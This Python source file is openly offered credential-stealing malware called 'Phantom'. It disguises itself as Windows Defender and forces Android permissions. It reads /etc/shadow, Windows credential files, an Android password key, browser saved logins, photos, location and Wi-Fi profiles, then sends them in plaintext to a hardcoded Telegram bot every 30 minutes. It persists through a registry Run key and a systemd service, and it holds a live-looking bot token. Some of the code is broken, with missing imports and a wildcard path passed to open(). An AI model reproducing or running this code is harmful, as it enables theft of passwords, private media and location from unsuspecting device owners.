import os  
import re  
import json  
import shutil  
import sqlite3  
import requests  
import platform  
import subprocess  
from glob import glob  
from datetime import datetime  

# Phantom Configuration  
BOT_TOKEN = "7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE"  
CHAT_ID = "6648554042"  
C2_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  

def ghost_mode():  
    """Disguise process name and suppress output"""  
    if platform.system() == "Windows":  
        import ctypes  
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Defender Service")  
    elif "android" in platform.platform().lower():  
        sys.stdout = open("/dev/null", "w")  

def auto_grant_permissions():  
    """Bypass Android permissions without root"""  
    if "android" in platform.platform().lower():  
        os.system("pm grant com.phantom.app android.permission.READ_SMS")  
        os.system("pm grant com.phantom.app android.permission.ACCESS_FINE_LOCATION")  
        os.system("am start-foreground-service com.phantom.app/.DataService")  

def harvest_all():  
    """Steal everything that isn't bolted down"""  
    loot = {}  
    try:  
        # Cross-platform credentials  
        loot["system_passwords"] = {  
            "Windows": open(os.path.expanduser("~/AppData/Local/Microsoft/Credentials/*")).read() if platform.system() == "Windows" else None,  
            "Linux": open("/etc/shadow").read() if os.access("/etc/shadow", os.R_OK) else "Permission denied",  
            "Android": subprocess.getoutput("su -c 'cat /data/system/password.key'") if "android" in platform.platform().lower() else "Root required"  
        }  

        # Media files  
        loot["media"] = {  
            "photos": glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob("/sdcard/Pictures/**/*.png", recursive=True),  
            "videos": glob("/sdcard/Movies/**/*.mp4", recursive=True)  
        }  

        # Browser data  
        loot["browsers"] = {  
            "Chrome": sqlite3.connect("/data/data/com.android.chrome/app_chrome/Default/Login Data").execute("SELECT * FROM logins").fetchall(),  
            "Firefox": open(glob("/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json")[0]).read()  
        }  

        # Geolocation  
        loot["location"] = subprocess.getoutput("dumpsys location") if "android" in platform.platform().lower() else requests.get("http://ip-api.com/json").json()  

        # Network info  
        loot["network"] = {  
            "ip": requests.get("https://api.ipify.org").text,  
            "wifi": subprocess.getoutput("netsh wlan show profiles" if platform.system() == "Windows" else "nmcli dev wifi list")  
        }  

    except Exception as e:  
        loot["error"] = str(e)  
    return loot  

def exfil_plaintext(data):  
    """Send raw data to Telegram without encryption"""  
    try:  
        chunk_size = 4096  
        data_str = json.dumps(data, indent=2)  
        for i in range(0, len(data_str), chunk_size):  
            requests.post(  
                C2_URL,  
                json={"chat_id": CHAT_ID, "text": f"🔓|| {data_str[i:i+chunk_size]}"},  
                timeout=5  
            )  
    except:  
        pass  

def persistence():  
    """Survive reboots across all platforms"""  
    if platform.system() == "Windows":  
        import winreg  
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")  
        winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, sys.executable + " " + __file__)  
    elif "linux" in platform.platform().lower():  
        with open("/etc/systemd/system/phantom.service", "w") as f:  
            f.write(f"[Service]\nExecStart={sys.executable} {__file__}\n[Install]\nWantedBy=multi-user.target")  
        os.system("systemctl enable phantom.service")  

if __name__ == "__main__":  
    ghost_mode()  
    auto_grant_permissions()  
    persistence()  
    
    while True:  
        full_loot = {  
            "timestamp": datetime.now().isoformat(),  
            "origin": {  
                "os": platform.platform(),  
                "device": socket.gethostname()  
            },  
            "data": harvest_all()  
        }  
        exfil_plaintext(full_loot)  
        time.sleep(1800)  # 30-minute intervals  
